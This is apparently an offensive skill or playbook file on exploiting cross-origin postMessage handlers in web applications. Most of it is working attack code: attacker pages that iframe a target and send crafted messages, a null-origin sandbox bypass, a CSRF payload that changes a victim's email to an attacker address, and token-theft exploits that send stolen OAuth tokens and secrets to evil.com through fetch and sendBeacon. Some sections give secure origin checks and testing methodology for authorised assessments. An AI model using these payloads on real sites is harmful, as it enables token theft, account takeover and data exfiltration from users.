---
name: postmessage
description: Cross-origin postMessage exploitation — enumerate listeners, bypass origin validation, chain to XSS/token theft/CSRF
---

# postMessage Exploitation

The `window.postMessage()` API enables cross-origin communication between windows, iframes, and workers. When message handlers lack proper origin validation or process message data unsafely, attackers can send crafted messages from malicious pages to trigger XSS, steal tokens, or perform actions on behalf of authenticated users. This is a high-value attack surface because postMessage handlers often have access to sensitive application state and authentication context.

## Attack Surface

**Where postMessage Handlers Live**
- OAuth/SSO popup flows (token passing between popup and opener)
- Payment and checkout iframes (Stripe, PayPal, custom payment flows)
- Chat widgets and customer support embeds
- Analytics and tracking iframes
- Ad tech and third-party integrations
- Cross-domain single sign-on bridges
- Web component communication in micro-frontend architectures
- Service worker and shared worker message handlers

**Identifying Handlers**
```javascript
// In browser console: list all event listeners on window
getEventListeners(window).message

// If getEventListeners is unavailable (non-Chrome):
// Override addEventListener before page loads
const origAdd = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, fn, opts) {
  if (type === 'message') console.log('Message listener added:', fn.toString().slice(0, 200));
  return origAdd.call(this, type, fn, opts);
};
```

**Finding Handlers in JavaScript Bundles**
```bash
# Search for message event listeners
grep -rn 'addEventListener.*message' ./static/js/
grep -rn 'onmessage\s*=' ./static/js/
grep -rn "\.on\s*(\s*['\"]message['\"]" ./static/js/

# Search for postMessage calls (to understand expected message format)
grep -rn 'postMessage\s*(' ./static/js/
grep -rn '\.postMessage\s*(' ./static/js/
```

## Key Vulnerabilities

### Missing Origin Validation

The most common and critical flaw — handlers that process messages without checking `event.origin`:

```javascript
// VULNERABLE: No origin check
window.addEventListener('message', function(event) {
  document.getElementById('output').textContent = event.data.text;
  // But if the handler writes to a DOM sink like .innerHTML, it becomes XSS
});

// VULNERABLE: Origin check is present but after processing
window.addEventListener('message', function(event) {
  processData(event.data);  // executed before origin check
  if (event.origin !== 'https://trusted.com') return;
});
```

**Exploit:**
```html
<!-- Attacker page hosted on evil.com -->
<iframe src="https://target.com/vulnerable-page" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    this.contentWindow.postMessage({
      text: 'controlled content',
      action: 'update'
    }, '*');
  };
</script>
```

### Weak Origin Validation (Regex Bypass)

```javascript
// VULNERABLE: indexOf check — bypassed with subdomain
window.addEventListener('message', function(event) {
  if (event.origin.indexOf('target.com') === -1) return;
  // Bypassed by: evil-target.com, target.com.evil.com
});

// VULNERABLE: endsWith check
if (!event.origin.endsWith('.target.com')) return;
// Bypassed by: eviltarget.com (no dot prefix check)

// VULNERABLE: regex without anchoring
if (!/target\.com/.test(event.origin)) return;
// Bypassed by: target.com.evil.com, evilxtargetxcom.evil.com

// VULNERABLE: startsWith without full URL
if (!event.origin.startsWith('https://target')) return;
// Bypassed by: https://target.evil.com
```

**Correct validation:**
```javascript
// SECURE: exact match
if (event.origin !== 'https://target.com') return;

// SECURE: allowlist
const allowed = ['https://target.com', 'https://app.target.com'];
if (!allowed.includes(event.origin)) return;
```

### Null Origin Bypass

When the handler checks for a specific origin, sandboxed iframes send `null` as the origin:
```javascript
// If handler allows null origin (common mistake)
if (event.origin === 'null' || event.origin === expectedOrigin) { ... }
```

**Exploit using sandboxed iframe:**
```html
<!-- Attacker page -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    parent.postMessage({action: 'setToken', token: 'attacker_token'}, '*');
  </script>
"></iframe>
```

The sandboxed iframe's origin is `null`, bypassing checks that expect a specific origin but also allow null.

### Token Theft via postMessage

OAuth popup flows frequently pass tokens via postMessage:
```javascript
// Target application's OAuth callback page
window.opener.postMessage({
  type: 'oauth_callback',
  token: 'eyJhbGciOiJIUzI1NiIs...'
}, '*');  // VULNERABLE: wildcard target origin
```

**Exploit:**
```html
<!-- Attacker opens popup to OAuth flow -->
<script>
  // Open the OAuth initiation URL
  var popup = window.open('https://target.com/auth/oauth/start');

  // Listen for the token
  window.addEventListener('message', function(event) {
    if (event.data && event.data.token) {
      // Steal the token
      fetch('https://evil.com/steal?token=' + event.data.token);
    }
  });
</script>
```

### postMessage to DOM XSS

Handlers that write message data to the DOM unsafely:
```javascript
window.addEventListener('message', function(event) {
  // Writes to a DOM sink (various dangerous patterns)
  document.getElementById('notification').insertAdjacentHTML('beforeend', event.data.message);

  // Sets href
  document.getElementById('link').href = event.data.url;

  // jQuery html method
  $('#container').html(event.data.content);
});
```

### postMessage to CSRF

Handlers that perform authenticated actions based on message data:
```javascript
window.addEventListener('message', function(event) {
  if (event.data.action === 'updateProfile') {
    fetch('/api/profile', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify(event.data.profile)
    });
  }
});
```

**Exploit:**
```html
<iframe src="https://target.com/settings" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    this.contentWindow.postMessage({
      action: 'updateProfile',
      profile: { email: 'attacker@evil.com' }
    }, '*');
  };
</script>
```

## Bypass Techniques

**Origin Check Bypasses**
- Register domains matching weak regex: `target.com.evil.com`, `evil-target.com`
- Use `data:` URIs (origin is `null`)
- Use `blob:` URIs (origin inherits from creator)
- Sandboxed iframes with `allow-scripts` (origin is `null`)
- `javascript:` URIs in some contexts

**Message Format Discovery**
```javascript
// Hook postMessage to discover expected format
const origPM = window.postMessage;
window.postMessage = function(msg, origin) {
  console.log('postMessage called:', JSON.stringify(msg), origin);
  return origPM.apply(this, arguments);
};
```

**Timing Attacks**
- Some handlers are only active during specific application states (loading, OAuth flow)
- Use `setTimeout` to send messages at the right moment
- Monitor `readyState` changes on the target iframe

## Tools

**Burp Suite DOM Invader**
```
1. Open Burp's built-in browser
2. Enable DOM Invader in the browser toolbar
3. Enable "Messages" monitoring
4. Navigate the target application
5. DOM Invader intercepts and logs all postMessage traffic
6. Test payloads directly from the DOM Invader panel
```

**PMHook (postMessage Hook)**
```javascript
// Inject into page to monitor all postMessage activity
(function() {
  const orig = window.addEventListener;
  window.addEventListener = function(type, fn, opts) {
    if (type === 'message') {
      const wrapped = function(event) {
        console.group('postMessage received');
        console.log('Origin:', event.origin);
        console.log('Data:', event.data);
        console.log('Source:', event.source ? 'window' : 'null');
        console.log('Handler:', fn.toString().slice(0, 500));
        console.groupEnd();
        return fn.call(this, event);
      };
      return orig.call(this, type, wrapped, opts);
    }
    return orig.call(this, type, fn, opts);
  };
})();
```

**Exploit Template Generator**
```html
<!-- Generic postMessage exploit template -->
<!DOCTYPE html>
<html>
<head><title>postMessage PoC</title></head>
<body>
  <iframe src="https://TARGET_URL" id="target"></iframe>
  <script>
    var TARGET_ORIGIN = 'https://target.com';
    var PAYLOAD = {/* message data */};

    document.getElementById('target').onload = function() {
      // Try sending the message
      this.contentWindow.postMessage(PAYLOAD, TARGET_ORIGIN);
      console.log('Payload sent:', PAYLOAD);
    };

    // Also listen for responses
    window.addEventListener('message', function(e) {
      console.log('Response from', e.origin, ':', e.data);
      // Log if it contains sensitive data
      if (e.data && (e.data.token || e.data.secret || e.data.key)) {
        navigator.sendBeacon('https://evil.com/collect', JSON.stringify({
          origin: e.origin,
          data: e.data
        }));
      }
    });
  </script>
</body>
</html>
```

## Testing Methodology

1. **Enumerate listeners** — Use browser DevTools, DOM Invader, or script injection to find all `message` event listeners on the target page
2. **Analyze handler code** — Read each handler's source to understand: expected message format, origin validation (if any), and what the handler does with the data
3. **Check origin validation** — Classify as: none, weak (regex/indexOf), or strong (exact match). Test bypass techniques for weak validation
4. **Discover message format** — Monitor legitimate postMessage traffic to understand expected data structure (type, action, payload fields)
5. **Test from cross-origin context** — Create an attacker page that iframes or opens the target and sends crafted messages
6. **Chain to impact** — Map handler actions to security impact: DOM write (XSS), fetch/XHR (CSRF), token handling (theft), redirect (open redirect)
7. **Test both directions** — Check if the target sends sensitive data via postMessage to `*` (wildcard origin) as well as receiving
8. **Test edge cases** — null origin (sandboxed iframe), timing-dependent handlers, message queuing

## Validation Requirements

1. **Cross-origin proof** — Demonstrate the exploit from a page on a different origin than the target (not from the browser console on the target page)
2. **Show the vulnerable handler** — Include the handler code showing missing or weak origin validation
3. **Demonstrate impact** — XSS execution, token theft, CSRF action, or sensitive data exfiltration
4. **Working HTML PoC** — Provide a self-contained HTML file that demonstrates the exploit when opened in a browser while the victim is authenticated to the target
5. **Victim interaction model** — Document what the victim must do (visit attacker page, click a link, etc.)

## False Positives

- Handlers with strict origin validation (exact match against a fixed allowlist)
- Messages that only receive non-sensitive data (UI theming, analytics events)
- Handlers that validate message structure/type before processing
- postMessage calls that target a specific origin (not wildcard) and the handler validates the source

## Impact

- **DOM XSS** — Message data written to DOM sinks leads to arbitrary script execution
- **Token theft** — OAuth tokens, session tokens, or API keys exfiltrated via intercepted postMessage
- **Account takeover** — Stolen tokens used to access victim's account; email change via CSRF through postMessage
- **CSRF** — Handlers that make authenticated requests based on message data
- **Sensitive data leakage** — Applications broadcasting sensitive state via postMessage with wildcard target origin

## Pro Tips

1. OAuth popup flows are the highest-value target — they frequently pass tokens via postMessage with wildcard origin
2. Always check BOTH directions: receiving messages (handler vulnerabilities) AND sending messages (sensitive data with `*` target)
3. Sandboxed iframes with `allow-scripts` produce `null` origin — useful for bypassing handlers that allow null
4. DOM Invader in Burp makes postMessage analysis significantly faster than manual approaches
5. Many SPAs use postMessage for cross-component communication — check React portals, micro-frontends, and iframe-embedded widgets
6. The handler may be in a third-party script (analytics, chat widget) — these are often less well-audited
7. Test with both `iframe` and `window.open` — some handlers only respond to one of `event.source === window.opener` or `event.source === window.parent`
8. When the handler expects a specific message type/action field, enumerate all valid actions from the codebase — some may be admin-only but still processed

## Summary

postMessage is a trust boundary that developers frequently misconfigure. Missing or weak origin validation in message handlers enables cross-origin XSS, token theft, and CSRF. Enumerate handlers via DevTools or code search, classify their origin validation, discover the expected message format, and exploit from a cross-origin attacker page. OAuth popup token passing and DOM write handlers are the highest-value targets.
